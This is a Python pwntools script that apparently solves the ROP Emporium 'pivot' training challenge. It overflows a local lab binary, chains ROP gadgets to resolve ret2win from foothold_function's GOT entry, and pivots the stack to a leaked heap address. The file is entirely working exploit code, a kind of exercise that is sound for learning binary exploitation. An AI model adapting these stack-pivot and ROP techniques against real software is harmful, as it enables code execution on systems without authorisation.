from pwn import *

bin = '/home/kali/Downloads/ropemporium/challenge7/64/pivot'
bin= ELF(bin)
context.binary , context.log_level = bin , 'info'
offset= 40

footplt= 0x400720
footgot= 0x601040
ret2win= 0xa81
foothold_function= 0x96a
ret2win_offset= ret2win- foothold_function

xchg_rsp_rax= 0x00000000004009bd
pop_rax= 0x00000000004009bb
call_rax= 0x00000000004006b0
mov_rax= 0x00000000004009c0
add_rax= 0x00000000004009c4
pop_rbp= 0x00000000004007c8

leak_call_chain=  p64(footplt)
leak_call_chain+= p64(pop_rax)
leak_call_chain+= p64(footgot)
leak_call_chain+= p64(mov_rax)
leak_call_chain+= p64(pop_rbp)
leak_call_chain+= p64(ret2win_offset)
leak_call_chain+= p64(add_rax)
leak_call_chain+= p64(call_rax)

p= process(bin.path)
p.recvuntil("pivot: 0x")
addr = int(p.recv(12), 16)
log.info("address received: 0x%x" % addr)

p.recvrepeat(0.2)
p.sendline(leak_call_chain)
p.recvrepeat(0.2)
stackpivot= flat( b'A' * 40, pop_rax, addr, xchg_rsp_rax)
p.sendline(stackpivot)
p.interactive()
